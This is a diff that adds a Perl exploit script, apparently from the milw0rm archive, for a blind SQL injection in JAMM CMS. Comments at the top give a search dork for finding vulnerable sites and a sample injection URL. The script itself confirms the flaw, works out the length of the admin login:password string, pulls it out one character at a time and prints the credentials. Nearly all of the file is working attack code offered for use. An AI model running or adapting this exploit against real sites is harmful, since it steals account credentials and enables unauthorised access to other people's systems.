@@ -1,0 +1,167 @@
+#!/usr/bin/perl
+######################
+#
+#JAMM CMS (id) Blind SQL Injection Vulnerability
+#
+######################
+#
+#Bug by: h0yt3r
+#
+#Dork: "powered by JAMM"
+#
+##
+###
+##
+#
+#http://www.site.de/cms/?id=blah
+#Ok when we give $id an unexpected value like this we get an SQL Error.
+#Unfortunately the script is so rude that it doesn't want to show us any data when we UNION SELECT.
+#But when we give $id an existing value and append AND 1=0 the site changes.
+#So Blind SQL Injection is possible.
+#For mySQL Version>=5 we can use subquerys to retrive data,
+#otherwise we have to use BENCHMARK().
+#
+#
+#SQL Injection:
+#http://[target]/[path]/index.php?id=[SQL]
+#
+#PoC for mySQL Version = 5:
+#index.php?id=10/**/and/**/substring((select/**/concat(login,0x3a,password)/**/from/**/jamm_cms_owen_website_user/**/limit/**/0,1),1,1)/**/like/**/0xbla/*
+#
+#If this condition returns true it would be the same as if we inject AND 1=1
+#so the site gives normal output.
+#
+#Possible Perl Exploit (will not work always because of different tablenames etc):
+#THIS IS JUST AN EXAPLE!!!
+
+use LWP::UserAgent;
+my $userAgent = LWP::UserAgent->new;
+
+usage();
+
+$server = $ARGV[0];
+$dir = $ARGV[1];
+
+
+print"\n";
+if (!$dir) { die "Read Usage!\n"; }
+
+
+$filename ="index.php";
+
+my $vulnCheck = "http://".$server.$dir.$filename;
+;
+
+my @Daten = ("61","62","63","64","65","66","67","68","69","6A","6B","6C","6D","6E","6F","70","71","72","73","74","75","76","77","78","79","7A","3A","5F","31","32","33","34","35","36","37","38","39","30");
+
+print"[x]Connecting:";
+my $Attack= $userAgent->get($vulnCheck."?id='");
+if($Attack->is_success)
+{
+    print " Connected \n";
+    print "[x]Vulnerable Check: ";
+    if($Attack->content =~ m/You have an error in your SQL syntax/i)
+        { print "Vulnerable \n"; }
+    else
+        { print "Not Vulnerable"; exit;}
+}
+
+else
+{
+    print " Connection Failed";
+    exit;
+}
+
+my $hex="";
+my $length;
+
+print "[x]Bruteforcing Length \n";
+
+my $lengthCounter = 1;
+while(1)
+{
+    ##table name will be different sometimes
+    my $url = "".$vulnCheck."?id=10%20%20and%20LENGTH((select%20concat(login,0x3a,password)%20from%20jamm_cms_owen_website_user%20limit%200,1))=".$lengthCounter."";
+    my $Attack= $userAgent->get($url);
+    my $content = $Attack->content;
+    if($content =~ m/<META NAME='Title' CONTENT=''>/i)
+    {       
+        $lengthCounter++;       
+    }
+    else
+    {
+        if($content =~ m/You have an error in your SQL syntax/i)
+        {
+            print "Something wrong. mySQL Version? "; exit;
+        }
+       
+        else
+        {
+            $length=$lengthCounter;       
+            last;
+        }
+    }
+}
+
+
+print "[x]Injecting Black Magic \n";
+
+for($b=1;$b<=$length;$b++)
+{
+    for(my $u=0;$u<28;$u++)
+    {       
+        ##table name will be different sometimes
+        my $url = "".$vulnCheck."?id=10%20%20and%20substring((select%20concat(login,0x3a,password)%20from%20jamm_cms_owen_website_user%20limit%200,1),".$b.",1)%20like%200x".$Daten[$u]."";
+
+        my $Attack= $userAgent->get($url);
+
+        my $content = $Attack->content;
+       
+        ##This will also change sometimes. Take content of AND 1=0
+        if($content =~ m/<META NAME='Title' CONTENT=''>/i)  
+        {           
+           
+        }
+
+        else
+        {
+            print "[x]    Found Char ".$Daten[$u]."\n";           
+            $hex=$hex.$Daten[$u];
+            last;           
+        }
+    }
+}
+
+print "[x]Converting \n";
+my $a_str = hex_to_ascii($hex);
+
+@login = split(/\:/, $a_str);
+
+print "[x]Success! \n";
+print "     Username: $login[0]\n";
+print "     Password: $login[1]";
+   
+sub hex_to_ascii ($)
+{       
+        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
+        return $str;
+}
+
+
+
+sub usage()
+{
+    print q
+    {
+    ######################################################
+             JAMM CMS Remote Blind SQL Injection Exploit   
+                         -Written by h0yt3r-            
+    Usage: JAMM_CMS.pl [Server] [Path]
+    Sample:
+    perl JAMM.pl.pl www.site.com /cms/
+    ######################################################
+    };
+
+}
+
+# milw0rm.com [2008-06-11]
